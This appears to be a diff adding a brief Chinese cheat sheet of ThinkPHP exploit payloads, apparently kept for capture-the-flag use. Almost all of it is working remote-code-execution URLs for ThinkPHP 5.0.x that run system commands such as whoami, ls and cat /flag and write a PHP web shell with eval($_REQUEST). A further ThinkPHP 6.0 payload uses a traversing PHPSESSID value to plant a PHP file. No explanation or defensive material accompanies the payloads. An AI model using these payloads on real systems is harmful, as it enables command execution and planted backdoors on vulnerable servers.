@@ -1,0 +1,12 @@
+受影响版本：ThinkPHP 5.0.x
+不受影响版本：ThinkPHP 5.0.24
+Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+Payload: ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /
+Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
+Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=shell.php&vars[1][1]=<?php eval($_REQUEST["a"]);?>
+
+
+thinkphp6.0漏洞
+/?a=a&b=123<php+phpinfo();+?>
+PHPSESSID=/../../..//public/a.php
